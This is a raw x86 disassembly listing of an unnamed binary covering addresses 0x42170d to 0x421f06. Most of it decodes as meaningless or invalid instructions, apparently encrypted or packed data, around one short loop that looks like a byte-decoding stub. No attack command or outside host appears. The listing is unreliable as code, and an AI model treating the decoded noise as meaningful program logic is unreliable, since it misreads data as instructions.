  42170d:	leave  
  42170e:	pop    ecx
  42170f:	fisub  WORD PTR [edx-0x25fcabf6]
  421715:	fnstsw WORD PTR [esi]
  421717:	mov    ah,0xff
  421719:	xor    al,BYTE PTR [edi+0x560167f4]
  42171f:	add    ebp,DWORD PTR [ebx-0x46c41a30]
  421725:	jmp    0x58cc:0x86afdb0f
  42172c:	loopne 0x421736
  42172e:	ret    
  42172f:	imul   eax,DWORD PTR [ecx+ebx*8],0xffffff99
  421733:	imul   ebx,ebx,0x57
  421736:	lahf   
  421737:	and    DWORD PTR [ebx],esp
  421739:	cmp    DWORD PTR [ebx-0x7c073397],ecx
  42173f:	inc    ebp
  421740:	int3   
  421741:	cmp    esi,DWORD PTR [edi+eax*4+0x30e22287]
  421748:	lock and ch,BYTE PTR [ebx+0x5f1b238c]
  42174f:	sbb    edi,DWORD PTR [edx+0xdd3cce9]
  421755:	repnz call 0x5186:0xa67182f5
  42175d:	mov    WORD PTR [ebp-0x4d6070bb],?
  421763:	push   ebp
  421764:	pop    edx
  421765:	fsub   st,st(5)
  421767:	sbb    al,0x10
  421769:	xor    BYTE PTR [esi-0x71],bh
  42176c:	ss and esp,esi
  42176f:	rol    DWORD PTR [edi+ecx*8-0x7fab6bf2],cl
  421776:	sar    DWORD PTR [eax+eiz*8+0x1b],1
  42177a:	sbb    BYTE PTR [ebx-0x42],ah
  42177d:	imul   ebx,eax,0xfffffff3
  421780:	cmp    DWORD PTR [eax+0x43f5a205],esp
  421786:	push   edx
  421787:	and    ebp,DWORD PTR [edi]
  421789:	pop    eax
  42178a:	push   ds
  42178b:	xor    eax,DWORD PTR [ebx-0x3d]
  42178e:	and    eax,0x8ae112a0
  421793:	stc    
  421794:	or     dh,0xbd
  421797:	idiv   ah
  421799:	pushf  
  42179a:	mov    edx,0x28dd3a13
  42179f:	in     eax,0x42
  4217a1:	xchg   edx,eax
  4217a2:	pop    ds
  4217a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217a4:	ins    BYTE PTR es:[edi],dx
  4217a5:	stc    
  4217a6:	and    DWORD PTR [ebx-0x1c4485d7],edx
  4217ac:	jne    0x421770
  4217ae:	fisub  WORD PTR [esi+0xd6ecefc]
  4217b4:	mov    DWORD PTR [ecx+0x57],ecx
  4217b7:	ins    BYTE PTR es:[edi],dx
  4217b8:	xchg   edi,eax
  4217b9:	sbb    BYTE PTR [ecx-0x2],cl
  4217bc:	test   al,0x28
  4217be:	(bad)
  4217c3:	aas    
  4217c4:	pop    ecx
  4217c5:	pushf  
  4217c6:	add    al,0xb0
  4217c8:	out    dx,al
  4217c9:	jmp    0xe6129ae4
  4217ce:	pop    es
  4217cf:	iret   
  4217d0:	pusha  
  4217d1:	loope  0x42177b
  4217d3:	add    eax,0xfbfaaa4d
  4217d8:	mov    ecx,0xddd31a33
  4217dd:	(bad)  
  4217de:	frstor ds:0x821b7d33
  4217e4:	loopne 0x4217a0
  4217e6:	shl    DWORD PTR [edx],cl
  4217e8:	lods   eax,DWORD PTR ds:[esi]
  4217e9:	ret    
  4217ea:	or     al,0xc3
  4217ec:	adc    DWORD PTR [edi+ebp*4+0x1f],eax
  4217f0:	repz (bad) 
  4217f2:	mov    eax,ds:0x6faaa28e
  4217f7:	pusha  
  4217f8:	mov    BYTE PTR [esi-0x6efd3856],cl
  4217fe:	xor    esi,esi
  421800:	jo     0x421840
  421802:	popf   
  421803:	add    BYTE PTR [esi-0x74],al
  421806:	mov    ebx,0xa24f573
  42180b:	nop
  42180c:	(bad)  
  42180d:	lods   al,BYTE PTR ds:[esi]
  42180e:	nop
  42180f:	test   al,0xd2
  421811:	sbb    BYTE PTR [ecx-0x73],0xf8
  421815:	jp     0x42185f
  421817:	setbe  BYTE PTR [eax+0x54c40f28]
  42181e:	ins    DWORD PTR es:[edi],dx
  42181f:	dec    ebx
  421820:	mov    gs,edi
  421822:	pop    esp
  421823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421824:	fdivr  DWORD PTR [esi+0x7]
  421827:	pop    ds
  421828:	pop    ebx
  421829:	jb     0x4217ac
  42182b:	bound  ebx,QWORD PTR [ebp+0x61d0ad41]
  421831:	mov    BYTE PTR [esi],cl
  421833:	pop    eax
  421834:	inc    esp
  421835:	mov    eax,0x929f0838
  42183a:	lock sbb bh,ah
  42183d:	jae    0x42180d
  42183f:	and    DWORD PTR [ebp-0x12],esp
  421842:	mov    ebp,0x4d7aabe9
  421847:	aad    0x61
  421849:	cli    
  42184a:	inc    eax
  42184b:	scas   al,BYTE PTR es:[edi]
  42184c:	mov    DWORD PTR [esi+0x12],ecx
  42184f:	lds    edi,FWORD PTR ds:0xbc9500e2
  421855:	push   ecx
  421856:	inc    eax
  421857:	push   esp
  421858:	push   ebx
  421859:	mov    ds:0x39f43a19,al
  42185e:	xor    al,0x5
  421860:	mov    ebx,0x7a657751
  421865:	push   ds
  421866:	mov    al,ds:0xaa4144ed
  42186b:	(bad)  
  42186c:	push   edx
  42186d:	shl    ecx,1
  42186f:	nop
  421870:	mov    esi,DWORD PTR [ebp-0x17]
  421873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421874:	icebp  
  421875:	outs   dx,DWORD PTR ds:[esi]
  421876:	std    
  421877:	psraw  mm1,QWORD PTR [eax]
  42187a:	or     DWORD PTR [edi],ecx
  42187c:	pop    eax
  42187d:	add    BYTE PTR [edx],dl
  42187f:	popf   
  421880:	jl     0x421900
  421882:	fidiv  WORD PTR [ebx-0x24]
  421885:	iret   
  421886:	popf   
  421887:	push   ss
  421888:	out    dx,eax
  421889:	mov    dl,0x56
  42188b:	jnp    0x421886
  42188d:	xor    eax,0x8e36cc06
  421892:	dec    esi
  421893:	lods   al,BYTE PTR ds:[esi]
  421894:	inc    ebx
  421895:	mov    ebp,0xb9848562
  42189a:	popf   
  42189b:	je     0x421908
  42189d:	retf   
  42189e:	inc    edi
  42189f:	and    DWORD PTR gs:[edx+0x21],eax
  4218a3:	lods   al,BYTE PTR ds:[esi]
  4218a4:	sbb    BYTE PTR [esi-0x69a9e6f4],ch
  4218aa:	ds mov edx,0x3fe80a56
  4218b0:	ficomp WORD PTR [edx-0x29fe482f]
  4218b6:	daa    
  4218b7:	cmp    BYTE PTR [esp+esi*2+0x67],0xc6
  4218bc:	sahf   
  4218bd:	or     BYTE PTR [esi+0x37f8a1cd],ah
  4218c3:	push   ebp
  4218c4:	mov    cl,0xe8
  4218c6:	loope  0x4218ff
  4218c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218c9:	mov    dl,BYTE PTR [edi-0x1f]
  4218cc:	aaa    
  4218cd:	xor    esi,0x293caa91
  4218d3:	mov    ch,0xd8
  4218d5:	js     0x421931
  4218d7:	mov    eax,0x38c26d50
  4218dc:	bound  esp,QWORD PTR [ebp-0x23]
  4218df:	sahf   
  4218e0:	push   ebp
  4218e1:	sti    
  4218e2:	push   ds
  4218e3:	js     0x421906
  4218e5:	pushf  
  4218e6:	inc    edx
  4218e7:	xchg   ecx,eax
  4218e8:	inc    esi
  4218e9:	sahf   
  4218ea:	mov    bl,0xe1
  4218ec:	mov    esi,0xfc183a41
  4218f1:	fidiv  DWORD PTR [ecx+ebx*8-0x3c458e95]
  4218f8:	and    eax,0xa397731b
  4218fd:	fmul   st(4),st
  4218ff:	adc    eax,0xa250e61e
  421904:	outs   dx,BYTE PTR ds:[esi]
  421905:	jl     0x421944
  421907:	scas   eax,DWORD PTR es:[edi]
  421908:	div    ebx
  42190a:	loopne 0x421984
  42190c:	jns    0x421979
  42190e:	jno    0x4218a9
  421910:	out    dx,al
  421911:	push   edi
  421912:	fwait
  421913:	xchg   DWORD PTR [ebx-0x32],ebx
  421916:	mov    cl,0x13
  421918:	(bad)  
  421919:	(bad)  
  42191a:	mov    cl,0x68
  42191c:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42191e:	icebp  
  42191f:	mov    ah,0x6a
  421921:	sub    eax,DWORD PTR [ebp+0x3]
  421924:	imul   esp,DWORD PTR [edi+0x4a917495],0xffffffc7
  42192b:	add    al,cl
  42192d:	nop
  42192e:	xchg   esp,eax
  42192f:	cs iret 
  421931:	dec    esp
  421932:	inc    dx
  421934:	and    al,0x7c
  421936:	je     0x421904
  421938:	fs mov bl,0x1a
  42193b:	ins    BYTE PTR es:[edi],dx
  42193c:	je     0x4218f3
  42193e:	jnp    0x42197f
  421940:	push   edi
  421941:	inc    ebp
  421942:	shr    BYTE PTR [ecx+0x501a93a],cl
  421948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421949:	push   0x721123c1
  42194e:	dec    esp
  42194f:	not    DWORD PTR [ecx+0x47696895]
  421955:	sar    esp,cl
  421957:	jp     0x42190d
  421959:	popa   
  42195a:	push   0xe5246349
  42195f:	xor    BYTE PTR [ebp+0x5e],ah
  421962:	int3   
  421963:	mov    bl,0xe6
  421965:	dec    ebx
  421966:	mov    ebx,0x723271d4
  42196b:	inc    ebx
  42196c:	pop    eax
  42196d:	sbb    eax,0x9e50f083
  421972:	(bad)  [eax]
  421974:	div    DWORD PTR [ecx-0x33]
  421977:	test   eax,0xee4e28ac
  42197c:	ret    0xbe7a
  42197f:	iret   
  421980:	scas   al,BYTE PTR es:[edi]
  421981:	jne    0x421936
  421983:	sub    ebx,DWORD PTR [ebx-0x70]
  421986:	test   al,0x21
  421988:	imul   edx,DWORD PTR [eax+0x4d35d658],0xf90da13b
  421992:	leave  
  421993:	jmp    0x421936
  421995:	push   eax
  421996:	mov    esp,0x236b8d26
  42199b:	push   ebp
  42199c:	stos   DWORD PTR es:[edi],eax
  42199d:	retf   
  42199e:	adc    BYTE PTR [edx-0x733420be],al
  4219a4:	fwait
  4219a5:	jns    0x421a0e
  4219a7:	pop    ebx
  4219a8:	lods   eax,DWORD PTR ds:[esi]
  4219a9:	rcl    cl,1
  4219ab:	or     edi,edi
  4219ad:	inc    ebx
  4219ae:	ret    0x574f
  4219b1:	(bad)  [edi-0x54bfcb02]
  4219b7:	pop    es
  4219b8:	iret   
  4219b9:	xor    esi,eax
  4219bb:	or     ebx,0x1c75ccdc
  4219c1:	clc    
  4219c2:	mov    ebx,0x4dca0b9a
  4219c7:	gs mov esi,0x2943152c
  4219cd:	out    dx,eax
  4219ce:	es in  eax,0xd6
  4219d1:	sbb    al,dh
  4219d3:	sti    
  4219d4:	mov    DWORD PTR [ebx+0x1248cc81],eax
  4219da:	xchg   ecx,eax
  4219db:	stc    
  4219dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219dd:	(bad)  
  4219de:	mov    ecx,0xb84c6464
  4219e3:	cld    
  4219e4:	jb     0x4219f8
  4219e6:	sbb    al,0x4c
  4219e8:	add    eax,0xaa6108c6
  4219ed:	or     al,0x21
  4219ef:	arpl   WORD PTR ds:0x425a70b0,di
  4219f5:	jnp    0x421a2f
  4219f7:	mov    BYTE PTR [ecx],0x2b
  4219fa:	and    DWORD PTR [eax+0x28ae552e],0x6eec7464
  421a04:	push   ds
  421a05:	fcom   DWORD PTR [esp+ebx*4]
  421a08:	dec    ebx
  421a09:	in     eax,0x6e
  421a0b:	mov    ch,BYTE PTR [edx+ebp*4+0x4d]
  421a0f:	cmp    dl,ah
  421a11:	loop   0x4219fc
  421a13:	sar    esi,cl
  421a15:	aam    0xca
  421a17:	inc    esp
  421a18:	ror    ch,1
  421a1a:	and    ah,bl
  421a1c:	dec    ebx
  421a1d:	inc    eax
  421a1e:	xchg   esp,eax
  421a1f:	sbb    DWORD PTR [ebx+0x7e],esp
  421a22:	sbb    DWORD PTR [eax],0xfffffffb
  421a25:	rcr    BYTE PTR cs:[ebp+0xe],cl
  421a29:	dec    DWORD PTR [ebx+0x186037b8]
  421a2f:	push   ebx
  421a30:	and    ecx,DWORD PTR [edi+0x2bf7f236]
  421a36:	pop    ss
  421a37:	call   0xa73c0346
  421a3c:	jno    0x421a52
  421a3e:	and    eax,0xffffffcc
  421a41:	jmp    0x95e7:0xc74a1d9d
  421a48:	or     edx,DWORD PTR [eax+0x57]
  421a4b:	xchg   ecx,eax
  421a4c:	loope  0x421a4c
  421a4e:	test   al,0x98
  421a50:	iret   
  421a51:	xor    edx,esi
  421a53:	xor    DWORD PTR [eax+0x5d76104a],0xffffffdc
  421a5a:	dec    esp
  421a5b:	das    
  421a5c:	fcomp  DWORD PTR [edi+ebp*1]
  421a5f:	xor    eax,0x91d662b8
  421a64:	and    dh,BYTE PTR [edx+0x6cd7d341]
  421a6a:	test   al,0xf8
  421a6c:	fs imul edx
  421a6f:	idiv   DWORD PTR [ebp+0x7083eb6e]
  421a75:	or     ah,bl
  421a77:	stos   DWORD PTR es:[edi],eax
  421a78:	xchg   esi,eax
  421a79:	loop   0x421a6d
  421a7b:	scas   eax,DWORD PTR es:[edi]
  421a7c:	fnstcw WORD PTR [edi+0x422aa8c4]
  421a82:	sub    al,0x98
  421a84:	dec    al
  421a86:	mov    ds:0x54cdd8bd,eax
  421a8b:	adc    DWORD PTR [esi+0x24],esp
  421a8e:	push   esi
  421a8f:	jecxz  0x421b0a
  421a91:	xchg   esi,eax
  421a92:	inc    edi
  421a93:	and    DWORD PTR [ebp+eax*1+0x78],eax
  421a97:	cmc    
  421a98:	sbb    eax,0x2e77616
  421a9d:	dec    edx
  421a9e:	push   eax
  421a9f:	fldenv [ebx+0x7b04a20]
  421aa5:	adc    DWORD PTR [eax-0x3b9e31fb],esp
  421aab:	(bad)  
  421aac:	(bad)  
  421aad:	fisttp DWORD PTR [eax-0x20230c68]
  421ab3:	push   eax
  421ab4:	ror    ecx,1
  421ab6:	ret    
  421ab7:	fs dec eax
  421ab9:	xchg   esp,eax
  421aba:	pop    es
  421abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421abc:	cmp    esp,DWORD PTR [eax-0x4919c21f]
  421ac2:	inc    eax
  421ac3:	cmp    BYTE PTR [eax+0x1a],0x52
  421ac7:	loop   0x421abf
  421ac9:	pop    edi
  421aca:	adc    eax,DWORD PTR [eax+0x13850f8f]
  421ad0:	add    BYTE PTR [eax],al
  421ad2:	add    BYTE PTR [ebx],bh
  421ad4:	pop    ebp
  421ad5:	hlt    
  421ad6:	je     0x423f0d
  421adc:	jmp    0x421ae6
  421ae1:	mov    esi,0x3272f8
  421ae6:	mov    eax,DWORD PTR [ebp-0x4]
  421ae9:	mov    edi,DWORD PTR [ebp-0x8]
  421aec:	xor    edi,edx
  421aee:	add    edi,esi
  421af0:	mov    esi,DWORD PTR [ebp+0x8]
  421af3:	imul   edi,ecx
  421af6:	mov    ebx,DWORD PTR [ebp+0xc]
  421af9:	xor    eax,edx
  421afb:	add    eax,ecx
  421afd:	mov    al,BYTE PTR [ebx+eax*1+0x3272f8]
  421b04:	mov    BYTE PTR [edi+esi*1],al
  421b07:	mov    eax,DWORD PTR [ebp-0x8]
  421b0a:	mov    esi,DWORD PTR [ebp+0x10]
  421b0d:	xor    eax,edx
  421b0f:	xor    ebx,ebx
  421b11:	add    esi,0xfabdbecf
  421b17:	adc    ebx,0xffffffff
  421b1a:	lea    ecx,[ecx+eax*1+0x3272f8]
  421b21:	xor    edi,edi
  421b23:	xor    esi,0x8a29a145
  421b29:	jmp    0x423ee8
  421b2e:	int    0x95
  421b30:	stos   BYTE PTR es:[edi],al
  421b31:	jmp    0xff36:0x517a
  421b37:	dec    ebx
  421b38:	jnp    0x421b18
  421b3a:	xor    ah,BYTE PTR [edi-0xa]
  421b3d:	mul    DWORD PTR [ebx]
  421b3f:	inc    edi
  421b40:	jl     0x421bbd
  421b42:	sbb    eax,0x4b7b7b9e
  421b47:	pop    eax
  421b48:	pop    ebp
  421b49:	sbb    al,0x33
  421b4b:	popa   
  421b4c:	int    0xeb
  421b4e:	pop    ds
  421b4f:	jae    0x421af3
  421b51:	shl    BYTE PTR [edx+0x47cd3ed8],cl
  421b57:	and    edi,DWORD PTR [edx-0x3b845008]
  421b5d:	shl    DWORD PTR [esp+edx*8],0x7f
  421b61:	dec    edx
  421b62:	dec    ebx
  421b63:	cmp    eax,0xd5b54323
  421b68:	and    eax,0x9c2a1bf6
  421b6d:	inc    ebx
  421b6e:	ins    BYTE PTR es:[edi],dx
  421b6f:	mov    DWORD PTR [edi+0x7df01a36],0x892b4c17
  421b79:	xchg   ebp,eax
  421b7a:	jns    0x421b9e
  421b7c:	sub    eax,0xa7822de7
  421b81:	dec    ecx
  421b82:	push   ss
  421b83:	stc    
  421b84:	xor    cl,BYTE PTR [eax]
  421b86:	jp     0x421bc2
  421b88:	dec    ebp
  421b89:	inc    edi
  421b8a:	mov    ebp,0x34b384a0
  421b8f:	inc    esi
  421b90:	pop    ss
  421b91:	jmp    DWORD PTR [eax+0x14]
  421b94:	xor    al,0x2a
  421b96:	inc    ebp
  421b97:	vfnmsub213sd xmm3,xmm7,xmm3
  421b9c:	mov    cl,0x5b
  421b9e:	mov    edi,0xa042627b
  421ba3:	xor    DWORD PTR [edx],esp
  421ba5:	xchg   esp,eax
  421ba6:	jge    0x421bf1
  421ba8:	mov    BYTE PTR [edi+0x2b],dh
  421bab:	sbb    DWORD PTR [ebp-0x42840033],ecx
  421bb1:	les    esi,FWORD PTR [bx+si]
  421bb4:	sti    
  421bb5:	cmp    eax,0xa9b50956
  421bba:	test   bl,ah
  421bbc:	or     BYTE PTR [edi+0x6489ca4d],bh
  421bc2:	cmp    esp,DWORD PTR [edx+esi*4-0x65a5b06]
  421bc9:	cmp    al,0x52
  421bcb:	sbb    al,0x75
  421bcd:	in     eax,dx
  421bce:	jge    0x421bb0
  421bd0:	push   ebx
  421bd1:	pop    esi
  421bd2:	pop    esi
  421bd3:	or     BYTE PTR [eax+ebx*2-0x60],ah
  421bd7:	inc    eax
  421bd8:	les    edx,FWORD PTR [edi]
  421bda:	add    BYTE PTR fs:[esi-0x2c],ch
  421bde:	in     al,dx
  421bdf:	push   0x40
  421be1:	pop    esi
  421be2:	mov    edi,DWORD PTR [edx-0xedab459]
  421be8:	mov    edx,0x1944887d
  421bed:	mov    dh,ch
  421bef:	xor    eax,0xb116a595
  421bf4:	lods   al,BYTE PTR ds:[esi]
  421bf5:	nop
  421bf6:	inc    ecx
  421bf7:	mov    edi,0x7c12d5a
  421bfc:	push   0x33c991df
  421c01:	xchg   DWORD PTR [ebx+edx*2-0x26],eax
  421c05:	out    0x61,eax
  421c07:	and    eax,0xb4d91d3a
  421c0c:	push   ss
  421c0d:	cmp    eax,0xc09a007e
  421c12:	stos   DWORD PTR es:[edi],eax
  421c13:	fld    DWORD PTR [ebx]
  421c15:	jae    0x421c23
  421c17:	les    ecx,FWORD PTR [ebx+eax*2]
  421c1a:	pop    ebp
  421c1b:	mov    esp,0x19239bfc
  421c20:	add    BYTE PTR [esp+eax*1-0xfb74f14],bh
  421c27:	mov    cl,BYTE PTR [ebp+0x58]
  421c2a:	inc    ebp
  421c2b:	push   cs
  421c2c:	fld    QWORD PTR [ecx]
  421c2e:	sbb    DWORD PTR [esi+0x42a505d2],0xffffff91
  421c35:	add    eax,0xf9fec52e
  421c3a:	shl    DWORD PTR [edx+0x5501cc9c],cl
  421c40:	and    eax,0x3b638d9d
  421c45:	les    esi,FWORD PTR [esi-0x71]
  421c48:	inc    edx
  421c49:	dec    eax
  421c4a:	cdq    
  421c4b:	ucomiss xmm7,DWORD PTR [ebp-0x17]
  421c4f:	push   ecx
  421c50:	daa    
  421c51:	idiv   ah
  421c53:	retf   0x9c43
  421c56:	add    DWORD PTR [edi],esi
  421c58:	inc    edi
  421c59:	add    eax,0x3fdddc6e
  421c5e:	mov    dh,0x85
  421c60:	or     DWORD PTR [ecx+ebx*4],ecx
  421c63:	mov    esp,0xb0b9d6ad
  421c68:	aam    0x3a
  421c6a:	mov    bl,0x78
  421c6c:	and    al,ch
  421c6e:	or     DWORD PTR [eax*4+0x15b3e731],eax
  421c75:	mov    eax,DWORD PTR [eax-0x39e6b3af]
  421c7b:	pop    edi
  421c7c:	xor    esp,eax
  421c7e:	pop    ecx
  421c7f:	adc    al,0x35
  421c81:	call   0x3c338de9
  421c86:	es sub eax,0x12e1e756
  421c8c:	adc    DWORD PTR [ebp-0x54],edi
  421c8f:	mov    bl,0x85
  421c91:	xchg   esp,eax
  421c92:	ins    BYTE PTR es:[edi],dx
  421c93:	ds jb  0x421c5c
  421c96:	pop    edx
  421c97:	push   edx
  421c98:	retf   
  421c99:	mov    cl,0x6b
  421c9b:	repz push edi
  421c9d:	idiv   BYTE PTR [edi+ebx*8+0x44ee31fa]
  421ca4:	sub    ch,BYTE PTR [eax-0x5d982350]
  421caa:	pop    ss
  421cab:	pop    ss
  421cac:	inc    eax
  421cad:	pop    edx
  421cae:	mov    gs,ebp
  421cb0:	in     al,0x31
  421cb2:	icebp  
  421cb3:	mov    ch,BYTE PTR [ecx]
  421cb5:	out    0x9e,al
  421cb7:	push   ecx
  421cb8:	or     al,ch
  421cba:	fstp   st(1)
  421cbc:	(bad)  
  421cbd:	dec    esp
  421cbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cbf:	std    
  421cc0:	addr16 ja 0x421d36
  421cc3:	adc    BYTE PTR [esi],ah
  421cc5:	dec    ebx
  421cc6:	and    ch,bh
  421cc8:	test   eax,0x85582e86
  421ccd:	push   edx
  421cce:	inc    ecx
  421ccf:	lock ja 0x421c6e
  421cd2:	loop   0x421d2d
  421cd4:	(bad)  
  421cd5:	fimul  WORD PTR [ecx-0x41]
  421cd8:	cld    
  421cd9:	fisubr WORD PTR [eax]
  421cdb:	cmp    bl,BYTE PTR [edx+0x59]
  421cde:	mov    ds:0x1e53d7a7,al
  421ce3:	in     eax,dx
  421ce4:	add    edi,0xb
  421ce7:	enter  0xe824,0x7
  421ceb:	sub    ebx,DWORD PTR [ebx+0x42]
  421cee:	or     al,0x8
  421cf0:	les    edi,FWORD PTR [ecx+edx*8-0x6a19abf7]
  421cf7:	daa    
  421cf8:	sub    al,0x12
  421cfa:	pmaxsw mm2,mm7
  421cfd:	shl    esi,1
  421cff:	mov    cl,0xc0
  421d01:	or     DWORD PTR [edi+0x4cb394da],ebp
  421d07:	shl    DWORD PTR [edx+0x19],1
  421d0a:	cmp    eax,0x5e5a8524
  421d0f:	xor    DWORD PTR [edx],edx
  421d11:	dec    ecx
  421d12:	inc    eax
  421d13:	sar    DWORD PTR [ecx+0x3c5c6924],0x55
  421d1a:	nop
  421d1b:	loope  0x421d77
  421d1d:	jne    0x421d74
  421d1f:	mov    ah,BYTE PTR [ecx-0x46]
  421d22:	or     bl,dh
  421d24:	pop    esp
  421d25:	inc    esp
  421d26:	in     al,0x66
  421d28:	dec    ebx
  421d29:	sahf   
  421d2a:	pop    edi
  421d2b:	xor    al,0xd9
  421d2d:	add    DWORD PTR [edi+0x1ff4d5d3],0xa0817c3b
  421d37:	loopne 0x421d63
  421d39:	lahf   
  421d3a:	adc    DWORD PTR [eax+0x433df5d9],edi
  421d40:	data16 xor al,0xae
  421d43:	in     al,0x8c
  421d45:	mov    esi,0xd5ff2a8a
  421d4a:	jecxz  0x421ce7
  421d4c:	fmul   st,st(5)
  421d4e:	inc    ebp
  421d4f:	cmp    DWORD PTR [ecx+edx*8-0x5b66df4e],0x20
  421d57:	push   ecx
  421d58:	jle    0x421d3a
  421d5a:	inc    ecx
  421d5b:	sbb    BYTE PTR ds:0x56eebd89,bl
  421d61:	pop    esp
  421d62:	mov    ds:0x2be06860,al
  421d67:	lods   eax,DWORD PTR ds:[esi]
  421d68:	das    
  421d69:	not    BYTE PTR fs:[edx+edx*1-0x7646b5ef]
  421d71:	inc    esp
  421d72:	lock mov ds:0xc723925c,eax
  421d78:	hlt    
  421d79:	dec    edi
  421d7a:	jne    0x421d61
  421d7c:	sub    ebp,DWORD PTR [ebx-0x5e]
  421d7f:	jge    0x421da0
  421d81:	out    dx,al
  421d82:	xor    eax,0x3e8aae9b
  421d87:	adc    DWORD PTR [esi],esp
  421d89:	sub    DWORD PTR [esp+ebp*1],ebx
  421d8c:	retf   0x723a
  421d8f:	cld    
  421d90:	into   
  421d91:	cmp    BYTE PTR [edx-0x80],bh
  421d94:	mov    eax,0xebd84b88
  421d99:	adc    DWORD PTR [esi-0x7fd08772],0x51
  421da0:	std    
  421da1:	adc    DWORD PTR [ecx],0x2bc980c0
  421da7:	push   es
  421da8:	loop   0x421d3a
  421daa:	in     al,dx
  421dab:	pop    edx
  421dac:	(bad)  
  421dad:	aad    0xf3
  421daf:	sub    bh,cl
  421db1:	iret   
  421db2:	jp     0x421dd5
  421db4:	jne    0x421e0a
  421db6:	push   edx
  421db7:	shl    al,1
  421db9:	std    
  421dba:	nop
  421dbb:	jns    0x421d62
  421dbd:	aad    0x16
  421dbf:	mov    bl,0x6e
  421dc1:	jb     0x421d43
  421dc3:	je     0x421dbd
  421dc5:	xor    ah,BYTE PTR [esi]
  421dc7:	fcom   QWORD PTR [esi-0x6e]
  421dca:	(bad)  
  421dcb:	pop    esi
  421dcc:	pop    ds
  421dcd:	hlt    
  421dce:	dec    ebp
  421dcf:	sbb    edi,DWORD PTR [edx+0x4cabbd9e]
  421dd5:	xor    DWORD PTR [edx-0x7864823c],ecx
  421ddb:	shl    bl,1
  421ddd:	lahf   
  421dde:	mov    BYTE PTR [edx],dh
  421de0:	mov    ebp,DWORD PTR [eax]
  421de2:	(bad)  
  421de3:	loopne 0x421dad
  421de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421de6:	idiv   dh
  421de8:	test   eax,0xcfe57bd0
  421ded:	mov    al,0xa2
  421def:	cs push ss
  421df1:	(bad)  
  421df2:	xchg   esp,eax
  421df3:	(bad)  
  421df4:	pop    ebx
  421df5:	sub    eax,0x9447563d
  421dfa:	xchg   BYTE PTR [edi+0x26],al
  421dfd:	and    eax,0x323a26b8
  421e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e03:	mov    al,ds:0xacfcfd13
  421e08:	not    BYTE PTR [ebx-0x33]
  421e0b:	loop   0x421df5
  421e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e0e:	fistp  DWORD PTR [edi]
  421e10:	inc    ebx
  421e11:	cmp    ah,0x27
  421e14:	sub    eax,0xeaa23de2
  421e19:	fisttp WORD PTR [ebp+edi*1-0x1811f68f]
  421e20:	mov    edx,0x9d219fbf
  421e25:	test   DWORD PTR [ebx+esi*1-0x748bc1e3],edi
  421e2c:	test   eax,0x8d391dad
  421e31:	push   0xffffffa6
  421e33:	mov    ss,eax
  421e35:	inc    ecx
  421e36:	fistp  DWORD PTR [edx+0x5ce5e08c]
  421e3c:	mov    ds:0x2e488fab,al
  421e41:	dec    eax
  421e42:	adc    BYTE PTR [esp+esi*2],0xc0
  421e46:	pop    ss
  421e47:	or     ebx,ecx
  421e49:	stos   DWORD PTR es:[edi],eax
  421e4a:	dec    ecx
  421e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e4c:	pop    ss
  421e4d:	mov    edx,DWORD PTR [ebx]
  421e4f:	sub    DWORD PTR [ebp+0x79a41061],esi
  421e55:	ret    
  421e56:	mov    dl,0x34
  421e58:	inc    esp
  421e59:	push   edx
  421e5a:	push   0x47f54136
  421e5f:	retf   
  421e60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e61:	add    eax,DWORD PTR [esi]
  421e63:	xchg   esp,eax
  421e64:	(bad)  
  421e66:	out    0xf1,al
  421e68:	fidiv  DWORD PTR [eax+esi*1+0x77]
  421e6c:	adc    ebx,DWORD PTR [edi-0x20]
  421e6f:	sub    ecx,DWORD PTR [ebx+0x44845b3f]
  421e75:	sbb    eax,0xcfc11a78
  421e7a:	jns    0x421e39
  421e7c:	xor    ebp,ebx
  421e7e:	xchg   BYTE PTR [esi],dh
  421e80:	lds    ecx,FWORD PTR [eax-0x4b]
  421e83:	fs or  al,0x41
  421e86:	jns    0x421e4a
  421e88:	sbb    al,0x4b
  421e8a:	inc    eax
  421e8b:	jmp    0x8530:0x8ab5e6df
  421e92:	repnz and BYTE PTR [esi+0x6034dd72],al
  421e99:	mov    ebp,0xb6259e5b
  421e9e:	xchg   ecx,eax
  421e9f:	retf   
  421ea0:	jmp    0x3a6443ff
  421ea5:	ins    DWORD PTR es:[edi],dx
  421ea6:	inc    edi
  421ea7:	jl     0x421eb4
  421ea9:	cld    
  421eaa:	je     0x421e58
  421eac:	adc    ebp,DWORD PTR [ecx-0x6a]
  421eaf:	mov    ds:0xc9b38e06,al
  421eb4:	test   al,0x81
  421eb6:	or     eax,0xfa579ebb
  421ebb:	lods   al,BYTE PTR ds:[esi]
  421ebc:	pusha  
  421ebd:	adc    DWORD PTR [edi-0x6c1d7938],ebx
  421ec3:	and    edx,esp
  421ec5:	pop    edi
  421ec6:	and    DWORD PTR [edi+0x468e5eeb],0x51
  421ecd:	jnp    0x421f41
  421ecf:	jmp    0xdbd57534
  421ed4:	popa   
  421ed5:	mov    edi,0xd25c3b19
  421eda:	je     0x421e64
  421edc:	add    DWORD PTR fs:[edx-0x3364ddbc],edi
  421ee3:	cmp    DWORD PTR [eax],ecx
  421ee5:	push   cs
  421ee6:	mov    eax,ds:0x31dd9953
  421eeb:	shr    BYTE PTR [ebx+0x56],0xf1
  421eef:	fs jl  0x421f50
  421ef2:	jle    0x421eda
  421ef4:	fistp  QWORD PTR [edi]
  421ef6:	push   0x845838ad
  421efb:	in     eax,0xbd
  421efd:	in     eax,dx
  421efe:	push   edi
  421eff:	sbb    eax,eax
  421f01:	xchg   edi,eax
  421f02:	jle    0x421efc
  421f04:	aaa    
  421f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f06:	dec    ecx
